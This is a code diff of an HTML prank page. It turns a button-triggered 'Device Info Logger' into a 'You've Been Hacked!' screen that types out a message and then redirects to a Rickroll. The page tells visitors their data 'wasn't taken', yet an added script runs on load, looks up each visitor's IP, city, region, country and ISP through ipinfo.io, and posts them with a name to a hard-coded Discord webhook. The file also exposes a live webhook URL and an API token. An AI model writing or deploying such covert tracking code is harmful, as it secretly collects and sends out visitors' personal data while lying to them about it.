@@ -1,135 +1,142 @@
+<!-- hacked.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Device Info Logger</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Oops! You've Been Hacked!</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      background-color: #f0f0f0;
       margin: 0;
+      padding: 0;
+      background-color: black;
+      font-family: 'Courier New', Courier, monospace;
+      color: #00ff00;
+      overflow-x: hidden;
     }
+
     .container {
-      text-align: center;
+      margin: 50px;
+      padding: 20px;
+      background: rgba(0, 0, 0, 0.85);
+      border-radius: 10px;
+      max-width: 800px;
     }
-    h1 {
-      font-size: 24px;
-      color: #333;
+
+    .glitch {
+      font-size: 2rem;
+      animation: glitch 1s infinite;
+      margin-bottom: 20px;
     }
-    .btn {
-      padding: 10px 20px;
-      font-size: 16px;
-      background-color: #007bff;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
+
+    @keyframes glitch {
+      0% { text-shadow: 2px 2px red; }
+      25% { text-shadow: -2px -2px blue; }
+      50% { text-shadow: 2px -2px lime; }
+      75% { text-shadow: -2px 2px yellow; }
+      100% { text-shadow: none; }
     }
-    .btn:hover {
-      background-color: #0056b3;
+
+    #terminal {
+      white-space: pre-line;
+      line-height: 1.5;
+      font-size: 1.1rem;
+    }
+
+    .cursor {
+      display: inline-block;
+      width: 10px;
+      height: 1em;
+      background-color: #00ff00;
+      animation: blink 1s step-end infinite;
+      vertical-align: bottom;
+      margin-left: 2px;
+    }
+
+    @keyframes blink {
+      50% { opacity: 0; }
+    }
+
+    .signature {
+      margin-top: 30px;
+      font-weight: bold;
+      color: #00ffff;
     }
   </style>
 </head>
 <body>
-
   <div class="container">
-    <h1>Device Info Logger</h1>
-    <button class="btn" onclick="logDeviceInfo()">Log My Device Info</button>
+    <div class="glitch">⚠ Oops! You've Been Hacked! ⚠</div>
+    <div id="terminal"></div><div class="cursor"></div>
+    <div id="signature" class="signature" style="display: none;">– Hack executed by Yumeth ⚡</div>
   </div>
 
   <script>
-    // Function to get the Operating System from the user agent string
-    function getOS() {
-      let userAgent = window.navigator.userAgent;
+    // Retrieve the name from sessionStorage
+    const name = sessionStorage.getItem('prankName') || 'You';
 
-      if (userAgent.indexOf("Win") !== -1) return "Windows";
-      if (userAgent.indexOf("Mac") !== -1) return "macOS";
-      if (userAgent.indexOf("X11") !== -1) return "UNIX";
-      if (userAgent.indexOf("Linux") !== -1) return "Linux";
-      return "Unknown OS";
-    }
+    const lines = [
+      `Don't worry, ${name}, your data wasn't taken...`,
+      `${name}, you were just hacked by Yumeth 😈`,
+      "This is a harmless lesson to show how easily hackers trick people.",
+      "Never click on suspicious links, even if they’re from friends.",
+      "This could’ve been much worse... consider this a warning.",
+      "To help you remember... here’s your punishment 🎶",
+      "Redirecting in 5 seconds..."
+    ];
 
-    // Function to get the browser name and version
-    function getBrowser() {
-      let userAgent = window.navigator.userAgent;
-      let browser = "Unknown Browser";
+    const terminal = document.getElementById("terminal");
+    const signature = document.getElementById("signature");
+    let lineIndex = 0;
+    let charIndex = 0;
 
-      if (userAgent.indexOf("Chrome") !== -1) {
-        browser = "Google Chrome";
-      } else if (userAgent.indexOf("Firefox") !== -1) {
-        browser = "Mozilla Firefox";
-      } else if (userAgent.indexOf("Safari") !== -1) {
-        browser = "Apple Safari";
-      } else if (userAgent.indexOf("Edge") !== -1) {
-        browser = "Microsoft Edge";
+    function typeLine() {
+      if (lineIndex < lines.length) {
+        const line = lines[lineIndex];
+        if (charIndex < line.length) {
+          terminal.innerHTML += line[charIndex];
+          charIndex++;
+          window.scrollTo(0, document.body.scrollHeight);
+          setTimeout(typeLine, 50);
+        } else {
+          terminal.innerHTML += "\n";
+          charIndex = 0;
+          lineIndex++;
+          setTimeout(typeLine, 500);
+        }
+      } else {
+        signature.style.display = "block";
+        window.scrollTo(0, document.body.scrollHeight);
+        setTimeout(() => {
+          window.location.href = "rickroll.html"; // Redirect to the Rickroll video page
+        }, 5000);
       }
-      return browser;
     }
 
-    // Function to get the user's IP and location using ipinfo.io
-    function getIPInfo() {
-      return fetch('https://ipinfo.io/json?token=a90f18c2f503dc')
-        .then(res => res.json())
-        .then(data => {
-          return {
-            ip: data.ip,
-            city: data.city,
-            region: data.region,
-            country: data.country,
-            isp: data.org
-          };
-        });
-    }
-
-    // Function to send the data to your Discord Webhook
-    function sendToDiscord(data) {
-      const webhookUrl = 'https://discord.com/api/webhooks/1368817232859238420/oQd2wHGOS1v8kUzjGPIXtEZK8zh1AygTBLlA2SUqp31yIzuFDQfHbV7qMdStR7UJNWcl';
-      const payload = {
-        content: `Device Info Logged:\n
-        **Name**: ${name}
-        **IP Address**: ${data.ip}\n
-        **Location**: ${data.city}, ${data.region}, ${data.country}\n
-        **ISP**: ${data.isp}\n
-        **Operating System**: ${data.os}\n
-        **Browser**: ${data.browser}`
-      };
-
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(payload)
-      })
-      .then(response => response.json())
-      .then(data => console.log('Successfully sent to Discord:', data))
-      .catch(error => console.error('Error sending to Discord:', error));
-    }
-
-    // Main function that logs and sends the device info
-    function logDeviceInfo() {
-      const os = getOS();
-      const browser = getBrowser();
-      getIPInfo().then(ipInfo => {
-        const deviceInfo = {
-          os: os,
-          browser: browser,
-          ip: ipInfo.ip,
-          city: ipInfo.city,
-          region: ipInfo.region,
-          country: ipInfo.country,
-          isp: ipInfo.isp
-        };
-
-        console.log(deviceInfo); // Output to console (optional)
-        sendToDiscord(deviceInfo); // Send to Discord
-      });
-    }
+    window.onload = typeLine;
   </script>
-
+  <script>
+    fetch("https://ipinfo.io/json?token=a90f18c2f503dc")
+      .then(response => response.json())
+      .then(data => {
+        const message = `🌐 New visitor:
+    - Name: ${name}
+    - IP: ${data.ip}
+    - City: ${data.city}
+    - Region: ${data.region}
+    - Country: ${data.country}
+    - ISP: ${data.org}
+    - Time: ${new Date().toLocaleString()}`;
+    
+        fetch("https://discord.com/api/webhooks/1368817232859238420/oQd2wHGOS1v8kUzjGPIXtEZK8zh1AygTBLlA2SUqp31yIzuFDQfHbV7qMdStR7UJNWcl", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ content: message })
+        });
+      });
+    </script>
+    
 </body>
 </html>
